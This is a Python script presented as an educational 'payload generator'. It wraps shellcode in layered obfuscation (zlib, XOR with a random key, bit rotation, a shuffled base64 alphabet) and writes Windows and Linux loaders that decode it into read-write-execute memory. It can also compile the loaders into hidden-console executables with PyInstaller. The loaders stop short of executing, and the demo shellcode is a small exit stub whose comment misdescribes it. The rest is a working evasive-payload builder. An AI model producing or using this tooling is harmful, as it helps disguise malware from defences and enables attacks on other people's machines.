#!/usr/bin/env python3
"""
Simple Payload Generator - A basic tool to generate encoded payloads
For educational purposes only

This script creates payloads with various encoding methods that can be compiled to executables.
No external dependencies required - works with standard Python libraries.
"""

import argparse
import base64
import os
import random
import string
import struct
import sys
import zlib

class PayloadEncoder:
    """Handles different encoding methods for payloads"""
    
    @staticmethod
    def xor_encode(data, key):
        """XOR encode data with key"""
        if isinstance(key, str):
            key = key.encode()
            
        result = bytearray()
        for i in range(len(data)):
            result.append(data[i] ^ key[i % len(key)])
        return bytes(result)
    
    @staticmethod
    def rol_encode(data, shift):
        """Rotate left bits encoding"""
        result = bytearray()
        for b in data:
            result.append(((b << shift) | (b >> (8 - shift))) & 0xFF)
        return bytes(result)
    
    @staticmethod
    def custom_b64encode(data):
        """Custom Base64 encoding with modified alphabet"""
        # Custom alphabet (standard base64 alphabet shuffled)
        custom_alphabet = 'ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba9876543210+/'
        standard = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
        
        # First get standard base64
        b64_data = base64.b64encode(data).decode()
        
        # Then translate to custom alphabet
        trans_table = str.maketrans(standard, custom_alphabet)
        return b64_data.translate(trans_table).encode()
    
    @staticmethod
    def custom_b64decode(data):
        """Decode custom Base64 data"""
        if isinstance(data, bytes):
            data = data.decode()
            
        # Custom alphabet (standard base64 alphabet shuffled)
        custom_alphabet = 'ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba9876543210+/'
        standard = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
        
        # Translate from custom alphabet to standard
        trans_table = str.maketrans(custom_alphabet, standard)
        standard_b64 = data.translate(trans_table)
        
        # Decode standard base64
        return base64.b64decode(standard_b64)
    
    @staticmethod
    def multi_encode(data, key):
        """Apply multiple encoding layers"""
        # Step 1: Compress
        compressed = zlib.compress(data)
        
        # Step 2: XOR encode
        xored = PayloadEncoder.xor_encode(compressed, key)
        
        # Step 3: Bit rotation
        rotated = PayloadEncoder.rol_encode(xored, 3)
        
        # Step 4: Custom base64
        encoded = PayloadEncoder.custom_b64encode(rotated)
        
        return encoded
    
    @staticmethod
    def multi_decode(data, key):
        """Decode multi-encoded data"""
        # Step 1: Custom base64 decode
        decoded = PayloadEncoder.custom_b64decode(data)
        
        # Step 2: Reverse bit rotation (rotate right)
        derotated = bytearray()
        for b in decoded:
            derotated.append(((b >> 3) | (b << (8 - 3))) & 0xFF)
        
        # Step 3: XOR decode
        dexored = PayloadEncoder.xor_encode(bytes(derotated), key)
        
        # Step 4: Decompress
        decompressed = zlib.decompress(dexored)
        
        return decompressed

class PayloadGenerator:
    """Generates payload files with encoders"""
    
    def __init__(self):
        # Payload templates for different platforms
        self.windows_template = r'''
import ctypes
import sys
from ctypes import wintypes
import struct

# Define Windows constants and structures
PAGE_EXECUTE_READWRITE = 0x40
PROCESS_ALL_ACCESS = 0x1F0FFF
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000

kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)

VirtualAlloc = kernel32.VirtualAlloc
VirtualAlloc.restype = wintypes.LPVOID
VirtualAlloc.argtypes = (
    wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD, wintypes.DWORD)

# Placeholder for actual shellcode - This is just a demonstration
shellcode = b"{shellcode}"

# Decode the shellcode
{decode_logic}

print("[*] Allocating memory...")
# Allocate memory for shellcode
buffer = VirtualAlloc(
    None,
    len(decoded_shellcode),
    MEM_COMMIT | MEM_RESERVE,
    PAGE_EXECUTE_READWRITE
)

print("[*] Copying shellcode to memory...")
# Copy shellcode to allocated memory
ctypes.memmove(buffer, decoded_shellcode, len(decoded_shellcode))

print("[*] This is where execution would happen in a real tool")
print("[*] No actual execution is implemented")
print("[*] Demo complete")
'''

        self.linux_template = r'''
#!/usr/bin/env python3
import ctypes
import sys
import os
import mmap

# Placeholder for actual shellcode - This is just a demonstration
shellcode = b"{shellcode}"

# Decode the shellcode
{decode_logic}

print("[*] Allocating memory...")
# Allocate executable memory
size = len(decoded_shellcode)
mem = mmap.mmap(
    -1,  # Anonymous mapping
    size,
    prot=mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC,
    flags=mmap.MAP_PRIVATE | mmap.MAP_ANONYMOUS
)

print("[*] Copying shellcode to memory...")
# Copy shellcode to allocated memory
mem.write(decoded_shellcode)

print("[*] This is where execution would happen in a real tool")
print("[*] No actual execution is implemented")
print("[*] Demo complete")
'''

        # Demo shellcode (just prints a message - no actual malicious code)
        self.demo_shellcode = (
            # x86/x64 compatible shellcode that would simply exit
            b"\x31\xc0\x40\xb7\x01\x31\xdb\xcd\x80"  # xor eax, eax; inc eax; xor ebx, ebx; int 0x80
        )
    
    def generate_key(self, length=16):
        """Generate a random key for encoding"""
        return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))
    
    def generate_payload(self, output_file, platform="linux", encoding="multi"):
        print(f"[+] Generating payload for {platform} with {encoding} encoding...")
        
        # Generate a random key
        key = self.generate_key()
        
        # Basic shellcode for demo purposes
        shellcode = self.demo_shellcode
        
        # Encode the shellcode based on selected method
        if encoding == "xor":
            encoded_shellcode = PayloadEncoder.xor_encode(shellcode, key)
            decode_logic = f'''
key = "{key}"
key_bytes = key.encode() if isinstance(key, str) else key
decoded_shellcode = bytearray()
encoded_data = shellcode
for i in range(len(encoded_data)):
    decoded_shellcode.append(encoded_data[i] ^ key_bytes[i % len(key_bytes)])
decoded_shellcode = bytes(decoded_shellcode)
'''
        elif encoding == "b64custom":
            encoded_shellcode = PayloadEncoder.custom_b64encode(shellcode)
            decode_logic = '''
def custom_b64decode(data):
    """Decode custom Base64 data"""
    if isinstance(data, bytes):
        data = data.decode()
        
    # Custom alphabet (standard base64 alphabet shuffled)
    custom_alphabet = 'ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba9876543210+/'
    standard = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    
    # Translate from custom alphabet to standard
    trans_table = str.maketrans(custom_alphabet, standard)
    standard_b64 = data.translate(trans_table)
    
    # Decode standard base64
    import base64
    return base64.b64decode(standard_b64)

decoded_shellcode = custom_b64decode(shellcode)
'''
        else:  # multi by default
            encoded_shellcode = PayloadEncoder.multi_encode(shellcode, key)
            decode_logic = f'''
import zlib

key = "{key}"
key_bytes = key.encode() if isinstance(key, str) else key

# Step 1: Custom base64 decode
def custom_b64decode(data):
    """Decode custom Base64 data"""
    if isinstance(data, bytes):
        data = data.decode()
        
    # Custom alphabet (standard base64 alphabet shuffled)
    custom_alphabet = 'ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba9876543210+/'
    standard = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    
    # Translate from custom alphabet to standard
    trans_table = str.maketrans(custom_alphabet, standard)
    standard_b64 = data.translate(trans_table)
    
    # Decode standard base64
    import base64
    return base64.b64decode(standard_b64)

decoded = custom_b64decode(shellcode)

# Step 2: Reverse bit rotation (rotate right)
derotated = bytearray()
for b in decoded:
    derotated.append(((b >> 3) | (b << (8 - 3))) & 0xFF)

# Step 3: XOR decode
dexored = bytearray()
for i in range(len(derotated)):
    dexored.append(derotated[i] ^ key_bytes[i % len(key_bytes)])

# Step 4: Decompress
decoded_shellcode = zlib.decompress(bytes(dexored))
'''
        
        # Format shellcode as string
        shellcode_str = ", ".join([f"0x{b:02x}" for b in encoded_shellcode])
        shellcode_bytes = f"bytes([{shellcode_str}])"
        
        # Select the template based on platform
        if platform == "windows":
            template = self.windows_template
        else:
            template = self.linux_template
        
        # Create the payload
        payload_code = template.format(
            shellcode=shellcode_bytes,
            decode_logic=decode_logic
        )
        
        # Write to file
        with open(output_file, "w") as f:
            f.write(payload_code)
        
        # Make file executable on Linux
        if platform == "linux":
            os.chmod(output_file, 0o755)
        
        print(f"[+] Generated payload: {output_file}")
        print(f"[+] Encoding: {encoding}")
        print(f"[+] Key: {key}")

def compile_to_exe(input_file, output_name):
    """Compile Python script to executable using PyInstaller"""
    try:
        import PyInstaller
    except ImportError:
        print("[!] PyInstaller is not installed. Installing now...")
        import subprocess
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pyinstaller"])
        
    import subprocess
    print(f"[*] Compiling {input_file} to executable...")
    
    # Build command
    cmd = [
        "pyinstaller",
        "--onefile",
        "--noconsole",
        f"--name={output_name}",
        input_file
    ]
    
    try:
        subprocess.check_call(cmd)
        exe_path = os.path.join("dist", output_name)
        if os.path.exists(exe_path):
            print(f"[+] Successfully created executable: {exe_path}")
            return True
        else:
            print(f"[!] Failed to create executable at expected path: {exe_path}")
            return False
    except subprocess.CalledProcessError as e:
        print(f"[!] Error during compilation: {e}")
        return False

def main():
    """Main entry point"""
    print("""
    ╔══════════════════════════════════════════════════╗
    ║      Simple Multi-Encoder Payload Generator      ║
    ║       Educational Tool - Demonstration           ║
    ╚══════════════════════════════════════════════════╝
    """)
    
    parser = argparse.ArgumentParser(description="Simple Payload Generator - Educational Tool")
    parser.add_argument("-o", "--output", required=True, help="Output filename (.py or .exe)")
    parser.add_argument("-p", "--platform", choices=["windows", "linux"], default="linux", 
                        help="Target platform (windows or linux)")
    parser.add_argument("-e", "--encoding", choices=["xor", "b64custom", "multi"], default="multi",
                        help="Encoding method to use")
    parser.add_argument("-x", "--exe", action="store_true", help="Compile to executable (requires PyInstaller)")
    parser.add_argument("--exe-name", help="Name for the executable (without extension)")
    
    args = parser.parse_args()
    
    # Generate the payload
    generator = PayloadGenerator()
    
    # Determine file extension based on platform
    if args.output.endswith('.py'):
        output_py = args.output
    else:
        output_py = args.output + '.py'
    
    # Generate payload
    generator.generate_payload(output_py, args.platform, args.encoding)
    
    # Compile to executable if requested
    if args.exe:
        exe_name = args.exe_name or os.path.splitext(os.path.basename(args.output))[0]
        if compile_to_exe(output_py, exe_name):
            print(f"[+] Executable created: dist/{exe_name}")
        else:
            print("[!] Failed to create executable")
    
    print("\n[+] Done! For educational purposes only.")

if __name__ == "__main__":
    main()
